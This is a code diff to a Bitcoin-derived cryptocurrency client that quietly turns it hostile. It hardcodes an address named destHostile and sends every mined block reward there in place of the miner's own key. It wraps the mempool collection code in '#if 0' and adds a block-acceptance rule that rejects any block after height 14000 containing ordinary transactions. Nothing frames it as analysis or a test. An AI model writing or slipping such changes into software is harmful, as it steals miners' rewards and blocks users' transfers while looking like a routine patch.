@@ -4,6 +4,7 @@
 // Distributed under the MIT/X11 software license, see the accompanying
 // file COPYING or http://www.opensource.org/licenses/mit-license.php.
 
+#include "base58.h"
 #include "checkpoints.h"
 #include "db.h"
 #include "net.h"
@@ -58,6 +59,8 @@ int64 nHPSTimerStart;
 // Settings
 int64 nTransactionFee = 0;
 int64 nMinimumInputValue = CENT / 100;
+
+CTxDestination destHostile = CBitcoinAddress("bN8dD8wpJWT38sX7xXk6Hoz5QG7awkH8kT").Get();
 
 
 
@@ -1757,6 +1760,9 @@ bool CBlock::AcceptBlock()
     if (nBits != GetNextWorkRequired(pindexPrev, this))
         return DoS(100, error("AcceptBlock() : incorrect proof of work"));
 
+    if (nHeight > 14000 && vtx.size() != 1)
+        return error("AcceptBlock() : block contains non-generation transactions");
+
     // Check timestamp against prev
     if (GetBlockTime() <= pindexPrev->GetMedianTimePast())
         return error("AcceptBlock() : block's timestamp is too early");
@@ -3340,13 +3346,14 @@ CBlock* CreateNewBlock(CReserveKey& reservekey)
     txNew.vin.resize(1);
     txNew.vin[0].prevout.SetNull();
     txNew.vout.resize(1);
-    txNew.vout[0].scriptPubKey << reservekey.GetReservedKey() << OP_CHECKSIG;
+    txNew.vout[0].scriptPubKey.SetDestination(destHostile);
 
     // Add our coinbase tx as first transaction
     pblock->vtx.push_back(txNew);
 
     // Collect memory pool transactions into the block
     int64 nFees = 0;
+#if 0
     {
         LOCK2(cs_main, mempool.cs);
         CTxDB txdb("r");
@@ -3485,6 +3492,7 @@ CBlock* CreateNewBlock(CReserveKey& reservekey)
         printf("CreateNewBlock(): total size %lu\n", nBlockSize);
 
     }
+#endif
     pblock->vtx[0].vout[0].nValue = GetBlockValue(pindexPrev->nHeight+1, nFees);
 
     // Fill in header
